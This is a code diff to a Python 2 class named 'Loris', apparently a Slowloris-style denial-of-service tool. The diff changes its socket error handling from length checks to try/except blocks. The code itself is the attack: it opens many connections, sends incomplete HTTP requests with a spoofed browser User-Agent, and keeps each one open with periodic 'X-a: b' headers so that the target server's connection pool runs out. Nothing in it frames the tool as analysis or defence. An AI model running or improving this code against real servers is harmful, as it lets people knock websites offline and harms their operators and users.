@@ -54,8 +54,10 @@ class Loris:
         "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
         "Content-Length: 42\r\n"
         if sock is not None:
-            sent = sock.send(payload)
-            if sent is not len(payload):
+            try:
+                sent = sock.send(payload)
+            except:
+                print "something went wrong"
                 return -1
         for i in range(1, self.MAX_TIMEOUT):
             print "Attempting a " + str(i) + " second timeout"
@@ -100,8 +102,9 @@ class Loris:
                     "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
                     "Content-Length: 42\r\n"
                     if sockets[i] is not None:
-                        sent = sockets[i].send(payload)
-                        if sent is not len(payload):
+                        try:
+                            sockets[i].send(payload)
+                        except:
                             working[i] = False
 
             """ Send data """
@@ -110,8 +113,9 @@ class Loris:
                     if sockets[i]:
                         sock = sock[i]
                         message = "X-a: b\r\n"
-                        sent = sock.send(message)
-                        if sent is not len(message):
+                        try:
+                            sock.send(message)
+                        except:
                             working[i] = False
 
             """ Sleep for timeout """
